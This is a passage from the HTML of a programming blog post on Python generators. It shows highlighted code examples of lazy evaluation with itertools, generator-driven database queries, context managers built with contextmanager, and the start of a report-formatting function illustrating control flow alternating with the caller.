style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    squared </span><span class="token operator">=</span><span class="token plain"> candidate </span><span class="token operator">**</span><span class="token plain"> </span><span class="token number">2</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> max_value </span><span class="token operator">&lt;=</span><span class="token plain"> squared</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">break</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> squared </span><span class="token operator">%</span><span class="token plain"> </span><span class="token number">15</span><span class="token plain"> </span><span class="token operator">==</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        fizzbuzz_squares</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">append</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">squared</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Or more succinctly, with generator comprehension syntax:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">fizzbuzz_squares </span><span class="token operator">=</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">list</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">takewhile</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">lambda</span><span class="token plain"> i</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> i </span><span class="token operator">&lt;</span><span class="token plain"> max_value</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">i </span><span class="token operator">**</span><span class="token plain"> </span><span class="token number">2</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> i </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> count</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> i </span><span class="token operator">**</span><span class="token plain"> </span><span class="token number">2</span><span class="token plain"> </span><span class="token operator">%</span><span class="token plain"> </span><span class="token number">15</span><span class="token plain"> </span><span class="token operator">==</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre></div></div>
<p>Even more useful, is that if we don't know how many we need, we can remove that final <code>list</code> construction and the entire computation remains lazily delayed.
This is particularly key when the incremental computation that results from your generator involves more expensive work, like network traffic or blocking access to a database.
By pausing and resuming stack frames with the generator, each value is only computed right as it is needed, and the work can be aborted partway through with no extra cost:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> itertools </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> count</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> time </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> sleep</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> psycopg2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">expensive_queries</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">cursor</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> candidate </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> count</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        cursor</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">execute</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f"&lt;expensive analysis query using </span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">candidate</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">&gt;"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        sleep</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">10</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">yield</span><span class="token plain"> cursor</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">fetchone</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">conn </span><span class="token operator">=</span><span class="token plain"> psycopg2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">connect</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"dbname=test user=postgres"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cursor </span><span class="token operator">=</span><span class="token plain"> conn</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">cursor</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> result </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> expensive_queries</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">cursor</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> result</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain">  </span><span class="token comment" style="color:rgb(98, 114, 164)"># Check some behavior about result</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f"Found result: </span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">result</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string-interpolation interpolation number">0</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token string-interpolation interpolation operator">=</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)"> </span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">result</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string-interpolation interpolation number">1</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token string-interpolation interpolation operator">=</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)"> </span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">result</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string-interpolation interpolation number">2</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token string-interpolation interpolation operator">=</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)"> ..."</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">break</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cursor</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">close</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">conn</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">close</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="alternating-control-flow-with-the-caller">Alternating Control Flow With the Caller<a href="https://clifford.ressel.fyi/blog/python-generators-part1#alternating-control-flow-with-the-caller" class="hash-link" aria-label="Direct link to Alternating Control Flow With the Caller" title="Direct link to Alternating Control Flow With the Caller">​</a></h2>
<p>The next interesting use case for generators highlights the alternation with the caller of the generator.
This is a mechanism by which a reusable piece of code can "take turns" with the caller.
Context managers (that whole <code>with ... as:</code> syntax, for setup/teardown behavior) is implemented exactly this way.
This makes sense, as context managers are the most plain alternation of control flow possible: in my reusable code, I'll do some setup, then you do whatever you need to do, then I'll do some teardown.</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> contextlib </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> contextmanager</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> typing </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> Generator</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token decorator annotation punctuation" style="color:rgb(248, 248, 242)">@contextmanager</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">simple_context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token plain"> Generator</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token boolean">None</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token boolean">None</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token boolean">None</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"Setup in the generator"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">try</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">yield</span><span class="token plain">  </span><span class="token comment" style="color:rgb(98, 114, 164)"># "Here is my calling code"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">finally</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"Teardown in the generator"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">with</span><span class="token plain"> simple_context</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"Here is my calling code"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre></div></div>
<p>A further generalization of this control alternation includes taking multiple turns with the caller.
This way the caller can complete any individualized logic that would otherwise need extra modalities baked into the reusable code.
This use case is extensively taught by James Powell in some of his tech talks on generators, so I'll just extend <a href="https://www.youtube.com/watch?v=JasPrZqImxo" target="_blank" rel="noopener noreferrer">one of his examples</a> (based on 13:50):</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> typing </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> Generator</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> logging </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> getLogger</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">logger </span><span class="token operator">=</span><span class="token plain"> getLogger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">__name__</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># All output implementations send the same result:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)">#</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># New York        150,000</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># London      (    50,000)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Tokyo           120,000</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Berlin                -</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Shanghai        210,000</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">send_email</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">lines</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">str</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token boolean">None</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">pass</span><span class="token plain">  </span><span class="token comment" style="color:rgb(98, 114, 164)"># Implementation not relevant</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># ----</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># This is awful to modify,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># awful to test each modality for regression,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># and the testing gets even worse when</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># you think about combinations thereof</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">output_modal</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    markets</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    filename</span><span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    to_log</span><span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    to_email</span><span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    accounting</span><span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token boolean">None</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    align </span><span class="token operator">=</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">max</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token builtin" style="color:rgb(189, 147, 249)">map</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token builtin" style="color:rgb(189, 147, 249)">len</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> markets</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> to_email</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        lines </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> region</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> profit </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> markets</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">items</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> accounting</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> profit </span><span class="token operator">&lt;</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                profit </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"({:&gt;10,})"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token builtin" style="color:rgb(189, 147, 249)">format</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token operator">-</span><span class="token plain">profit</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">elif</span><span class="token plain"> profit </span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                profit </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">" {:&gt;10,}"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token builtin" style="color:rgb(189, 147, 249)">format</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">profit</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">else</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                profit </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">" {:&gt;10}"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token builtin" style="color:rgb(189, 147, 249)">format</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"-"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        line </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"{region:&lt;{align}}    {profit}"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token builtin" style="color:rgb(189, 147, 249)">format</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            region</span><span class="token operator">=</span><span class="token plain">region</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> profit</span><span class="token operator">=</span><span class="token plain">profit</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> align</span><span class="token operator">=</span><span class="token plain">align</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> filename</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">with</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">open</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">filename</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">as</span><span class="token plain"> f</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                f</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">write</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">line</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> to_email</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            lines</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">append</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">line</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> to_log</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token 